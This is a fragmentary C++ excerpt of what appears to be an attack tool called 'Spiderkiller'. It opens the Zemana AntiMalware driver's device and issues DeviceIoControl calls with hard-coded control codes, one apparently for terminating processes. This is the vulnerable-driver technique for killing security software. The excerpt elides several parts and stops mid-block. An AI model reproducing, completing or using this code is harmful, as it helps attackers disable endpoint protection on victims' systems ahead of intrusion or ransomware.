...
#define INIT_CODE 0x80002010
#define TPROCESS_CODE 0x80002048
#define DevicName "\\\\.\\ZemanaAntiMalware"
...
int main(const int argc, char** argv) {
    ...
    std::cout << "[+] Spiderkiller Start." << std::endl;
    std::cout << "[+] Spiderkiller Start." << std::endl;
    HANDLE HanDevice = CreateFileA(DevicName, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    ...
    BOOL result = DeviceIoControl(HanDevice, INIT_CODE, &input, sizeof(input), output, outputSize, &Returnedbytes, NULL);
    if (result)
    {
